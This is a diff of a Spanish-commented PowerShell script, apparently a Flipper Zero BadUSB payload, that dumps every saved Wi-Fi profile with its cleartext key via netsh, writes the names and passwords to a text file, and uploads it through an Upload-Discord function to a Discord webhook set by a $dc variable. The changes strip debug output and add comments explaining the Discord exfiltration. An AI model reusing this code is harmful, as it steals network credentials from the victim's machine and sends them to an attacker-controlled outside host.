@@ -11,8 +11,6 @@ New-Item -ItemType File -Path $filePath -Force
 foreach ($wifiNetwork in $wifiNetworks){
      $wifiNetwork = $wifiNetwork.split(":")[1].Trim()
      # Mostrar el valor de la variable $wifiNetwork en la consola
-     #Write-Host "El nombre de la red WiFi es: $wifiNetwork"
-
 
      # Obtener la contraseña de la red WiFi
      $wifiPassword = netsh wlan show profile name="$wifiNetwork" key=clear | Select-String 'Contenido de la clave'
@@ -20,14 +18,12 @@ foreach ($wifiNetwork in $wifiNetworks){
      $wifiPassword="$wifiPassword".split(":")[1].Trim()
 
      # Guardar la información en el archivo de texto
-     #Write-Host "El nombre de la password es: $wifiPassword"
 	 
      Add-Content -Path $filePath -Value "Network: $wifiNetwork`nPassword: $wifiPassword"
  }
 
-# Mostrar un mensaje de confirmación
-#Write-Host "La información de las redes WiFi se ha exportado exitosamente a $filePath"
 
+# Funcion creada por Jakoby para subir al servidor de Discord el archivo .txt
 function Upload-Discord {
 
 [CmdletBinding()]
@@ -37,7 +33,7 @@ param (
     [parameter(Position=1,Mandatory=$False)]
     [string]$text 
 )
-
+# URL de la API Discord que será obtenida por la variable $dc a traves de .txt que será ejecutado por FlipperZero.
 $hookurl = "$dc"
 
 $Body = @{
